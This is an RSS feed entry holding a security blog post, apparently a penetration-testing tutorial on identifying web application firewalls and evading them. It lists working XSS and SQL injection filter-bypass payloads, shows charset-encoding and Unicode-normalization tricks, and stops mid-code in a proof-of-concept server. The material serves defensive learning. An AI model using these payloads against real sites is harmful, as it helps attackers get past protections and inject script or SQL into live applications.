<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>WAF on Ally Petitt</title>
    <link>https://ally-petitt.github.io/ally-petitt/en/en/tags/waf/</link>
    <description>Recent content in WAF on Ally Petitt</description>
    <generator>Hugo -- 0.125.4</generator>
    <language>en</language>
    <lastBuildDate>Thu, 01 Jun 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://ally-petitt.github.io/ally-petitt/en/en/tags/waf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>5 Ways I Bypassed Your Web Application Firewall (WAF)</title>
      <link>https://ally-petitt.github.io/ally-petitt/en/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/</link>
      <pubDate>Thu, 01 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.github.io/ally-petitt/en/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/</guid>
      <description>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.&lt;/p&gt;
&lt;p&gt;WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.&lt;/p&gt;
&lt;p&gt;Depending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic. Regular expressions are used to detect patterns in a string of characters. You can read more about them &lt;a href=&#34;https://docs.python.org/3/library/re.html&#34;&gt;here&lt;/a&gt;. WAFs may also employ signature-based detection, where known malicious strings are given a signature that is stored in a database and the firewall will check the signature of the web traffic against the contents of the database. If there is a match, the traffic is blocked. Additionally, some firewalls use heuristic-based detection.&lt;/p&gt;
&lt;h1 id=&#34;identifying-wafs&#34;&gt;Identifying WAFs&lt;/h1&gt;
&lt;h2 id=&#34;manually&#34;&gt;Manually&lt;/h2&gt;
&lt;p&gt;As stated previously, WAFs will often block overtly malicious traffic. In order to trigger a firewall and verify its existence, an HTTP request can be made to the web application with a malicious query in the URL such as &lt;code&gt;https://example.com/?p4yl04d3=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;. The HTTP response may be different than expected for the webpage that is being visited. The WAF may return its own webpage such as the one shown below or a different status code, typically in the 400s.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*lDR9M2gtJzPvOdWg&#34; alt=&#34;Picture of Cloudflare firewall blocking a webpage.&#34;  /&gt;

Through a web proxy, cURL, or the “Network” tab of your browser’s DevTools additional indications of a firewall can be detected:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The name of the WAF in the &lt;code&gt;Server&lt;/code&gt; header (e.g. &lt;code&gt;Server: cloudflare&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Additional HTTP response headers associated with the WAF (e.g. &lt;code&gt;CF-RAY: xxxxxxxxxxx&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Cookies that appear to be set by a WAF (e.g. the response header&lt;code&gt;Set-Cookie: __cfduid=xxxxx&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Unique response code upon submitting malicious requests. (e.g. &lt;code&gt;412&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Aside from crafting malicious queries and evaluating the response, firewalls can also be detected by sending a &lt;code&gt;FIN/RST&lt;/code&gt; TCP packet to the server or implemening a side-channel attack. For instance, the timing of the firewall against different payloads can give hints as to the WAF being used.&lt;/p&gt;
&lt;h2 id=&#34;automations&#34;&gt;Automations&lt;/h2&gt;
&lt;p&gt;There are 3 automated methods of detecting and identifying WAFs that will be discussed in this article.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Running an Nmap Scan&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Nmap Scripting Engine (NSE) includes scripts for detecting and fingerprinting firewalls. These scripts can be seen in use below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 21:43 PDT  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report for example.com (xxx.xxx.xxx.xxx)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up (0.20s latency).  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT STATE SERVICE  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;443/tcp open https  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-waf-detect: IDS/IPS/WAF detected:  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|\_example.com:443/?p4yl04d3=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Ekultek/WhatWaf&#34;&gt;WafW00f&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Wafw00f is a command line utility that sends commonly-flagged payloads to the given domain name and assess the web server’s response to detect and identify the firewall when possible.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ wafw00f example.com 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8zeEz07TxwZ8VGBIaqxVvA.png&#34; alt=&#34;&#34;  /&gt;

3. &lt;a href=&#34;https://github.com/Ekultek/WhatWaf&#34;&gt;WhatWaf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In addition to detecting a firewall, WhatWaf can attempt to discover a bypass by utilizing tamper scripts and assessing the web server’s response to the various payloads.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_pCVKq8cL3ZTghqWG5BAyQ.png&#34; alt=&#34;&#34;  /&gt;

The results from WhatWaf are consistent with those of Wafw00f.&lt;/p&gt;
&lt;h1 id=&#34;bypassing-wafs&#34;&gt;Bypassing WAFs&lt;/h1&gt;
&lt;p&gt;This section will outline some of the potential WAF bypass techniques with examples.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Bypassing Regex&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;This method applies to the regex filtering done by both the WAF and web server. During a black box penetration test, finding the regular expression used by the WAF may not be an option. If the regex is accessible, this &lt;a href=&#34;https://www.secforce.com/blog/bypassing-wafs-web-application-filters/&#34;&gt;article&lt;/a&gt; explains regex bypass through case studies.&lt;/p&gt;
&lt;p&gt;Commmon bypasses include changing the case of the payload, using various encodings, substituting functions or characters, using an alternative syntax, and using &lt;a href=&#34;https://www.aleksandrhovhannisyan.com/blog/crlf-vs-lf-normalizing-line-endings-in-git/&#34;&gt;linebreaks&lt;/a&gt; or tabs. The examples below demonstrate some approaches to bypassing regex with comments.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;sCrIpT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(XSS)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;sCriPt&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#changing the case of the tag  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(XSS)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#prepending an additional &amp;#34;&amp;lt;&amp;#34;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(XSS) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#removing the closing tag  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;XSS&lt;span style=&#34;color:#f92672&#34;&gt;`&amp;lt;/&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#using backticks instead of parenetheses  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;java&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;ascript:&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;#using encoded newline characters  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;iframe src&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;malicous.com &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#double open angle brackets  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;STYLE&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;.classname&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;background&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;image:&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;javascript:alert(XSS)&amp;#34;&lt;/span&gt;);&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;STYLE&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#uncommon tags  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;img&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;src&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;onerror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#bypass space filter by using / where a space is expected  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;javascript:&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;xss&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#extra characters
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;obfuscation&#34;&gt;Obfuscation&lt;/h2&gt;
&lt;p&gt;While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Function&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ale&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rt(1)&amp;#34;&lt;/span&gt;)(); &lt;span style=&#34;color:#75715e&#34;&gt;#using uncommon functions besides alert, console.log, and prompt  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;javascript:&lt;span style=&#34;color:#ae81ff&#34;&gt;74163166147401571561541571411447514115414516216450615176&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#octal encoding  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;iframe src&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;javascript:alert(`xss`)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#unicode encoding  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/?&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;un&lt;span style=&#34;color:#75715e&#34;&gt;/**/&lt;/span&gt;ion&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;sel&lt;span style=&#34;color:#75715e&#34;&gt;/**/&lt;/span&gt;ect&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;-- #using comments in SQL query to break up statement  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;new Function&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;alt&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;``&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;#using backticks instead of parentheses  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;data:&lt;span style=&#34;color:#66d9ef&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#base64 encoding the javascript  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2397&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;lert&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;#using HTML encoding  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;a src&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Using Line Feed (LF) line breaks   
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;BODY onload&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#$%&amp;amp;()*~+-\_.,:;?@[/|\]^`=confirm()&amp;gt; # use any chars that aren&amp;#39;t letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Additional resources include &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads&#34;&gt;PayloadsAllTheThings&lt;/a&gt; and &lt;a href=&#34;https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html&#34;&gt;OWASP&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;2-charsethttpsbookhacktricksxyznetwork-services-pentestingpentesting-webwaf-bypass&#34;&gt;&lt;a href=&#34;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass&#34;&gt;2. Charset&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This technique involves modifying the &lt;code&gt;Content-Type&lt;/code&gt; header to use a different charset (e.g. &lt;code&gt;ibm500&lt;/code&gt;). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ python3  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-- snip --  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; import urllib.parse  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; s = &amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;xss&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; urllib.parse.quote\_plus(s.encode(&amp;#34;IBM037&amp;#34;))  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#39;L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The encoded string can then be sent in the request body and uploaded to the server.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;POST /comment/post HTTP/1.1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: chatapp  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: application/x-www-form-urlencoded; charset=ibm500  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: 74  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Content Size&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Unicode Compatibility&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*khYe6n5QPB7ar2GG.jpg&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg&#34;&gt;http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Unicode Compatibility is a concept that describes the decomposition of visually distinct characters into the same basic abstract character. It is a form of &lt;a href=&#34;https://en.wikipedia.org/wiki/Unicode_equivalence&#34;&gt;unicode equivalence&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For instance, the characters&lt;code&gt;／&lt;/code&gt;(U+FF0F) and &lt;code&gt;/&lt;/code&gt; (U+002F) are different, but in some contexts they will have the same meaning as each other. The shared meaning allows for the characters are compatible with each other, meaning that they can both be translated to the standard forward-slash character&lt;code&gt;/&lt;/code&gt;(U+002F) despite starting out as different characters. Digging deeper, whether &lt;code&gt;／&lt;/code&gt;(U+FF0F) and &lt;code&gt;/&lt;/code&gt; (U+002F) will end up as the same forward-slash character depends on the way that they are normalized, or translated, by the web server.&lt;/p&gt;
&lt;p&gt;Characters are typically normalized through one of the four standard Unicode normalization algorithms:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;NFC:&lt;/strong&gt; Normalization Form Canonical Composition&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NFD:&lt;/strong&gt; Normalization Form Canonical Decomposition&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NFKC:&lt;/strong&gt; Normalization Form Compatibility Composition&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NFKD:&lt;/strong&gt; Normalization Form Compatibility Decomposition&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NFKC and NFKD in particular will decompose the characters by compatibility, which is unlike NFC and NFD (more details &lt;a href=&#34;https://www.unicode.org/reports/tr15/&#34;&gt;here&lt;/a&gt;). The implication is that on web servers where the user input is first sanitized, then normalized with either NFKC or NFKD, the unexpected, compatible characters can bypass the WAF and execute as their canonical equivalents on the backend. This is a result of the WAF not expecting unicode-compatible characters. &lt;a href=&#34;https://jlajara.gitlab.io/Bypass_WAF_Unicode&#34;&gt;Jorge Lahara&lt;/a&gt; demonstrates this in the PoC webserver below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from flask import Flask, abort, request  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import unicodedata  
